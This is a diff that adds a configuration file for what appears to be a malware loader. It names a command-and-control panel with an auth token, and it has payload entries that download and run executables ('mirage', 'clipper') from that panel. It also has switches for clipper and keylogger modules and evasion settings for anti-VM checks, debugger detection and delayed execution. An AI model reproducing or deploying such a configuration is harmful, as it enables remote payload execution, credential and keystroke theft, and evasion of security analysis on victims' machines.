@@ -1,0 +1,17 @@
+[c2]
+panel_url = "https://panel.eidos.local:8443"
+auth_token = "change-me"
+
+[payloads]
+mirage = { url = "https://panel.eidos.local/payloads/mirage.exe", run = "exe" }
+clipper = { url = "https://panel.eidos.local/payloads/clipper.exe", run = "exe" }
+
+[modules]
+mirage = true
+clipper = false
+keylogger = false
+
+[evasion]
+anti_vm = true
+debugger_check = true
+delay_before_exec = 3000
